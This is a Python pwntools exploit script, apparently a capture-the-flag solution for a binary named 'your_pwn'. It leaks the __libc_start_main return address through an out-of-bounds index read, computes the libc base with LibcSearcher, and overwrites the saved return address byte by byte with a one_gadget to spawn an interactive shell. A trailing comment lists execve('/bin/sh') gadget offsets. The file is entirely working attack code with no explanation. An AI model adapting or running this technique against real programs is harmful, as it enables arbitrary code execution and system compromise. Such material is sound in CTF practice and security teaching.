#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = process('./your_pwn')
elf = ELF('./your_pwn')
context.log_level = 'debug'

libc_start_main = {}
program_base = {}

p.recvuntil('\nname:')
p.sendline('Railgun')


###leak libc###
offset = 632

for i in range(6):
	p.recvuntil('input index\n')
	p.sendline(str(offset + i))
	p.recvuntil('value(hex) ')
	libc_start_main_offset = p.recv(8)
	if(libc_start_main_offset[0]=='f'):
		libc_start_main_offset = int(libc_start_main_offset[6:],16)
	else:
		libc_start_main_offset = int(libc_start_main_offset[0:2],16)
	log.success('one address = '+hex(libc_start_main_offset))
	p.recvuntil('new value\n')
	p.sendline(str(libc_start_main_offset))
	libc_start_main[i] = libc_start_main_offset

__libc_ret = ''
for i in range(6):
    if(len(str(hex(libc_start_main[5-i])))<4):
        __libc_ret+= '0'+str(hex(libc_start_main[5-i]))[2:]
    else:
        __libc_ret+= str(hex(libc_start_main[5-i]))[2:]

__libc_ret = int(__libc_ret,16)
log.success('__libc_ret = '+hex(__libc_ret))

libc_start_main = __libc_ret - 240


libc = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')

###get shell###
offset = 344
one_gadget = libc_base + 0xf02a4

for i in range(6):
	p.recvuntil('input index\n')
	p.sendline(str(offset + i))
	p.recvuntil('new value\n')
	p.sendline(str(ord(p64(one_gadget)[i])))

p.sendline('get shell')#go to ret
p.recvuntil('(yes/no)? \n')
p.interactive()


'''
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''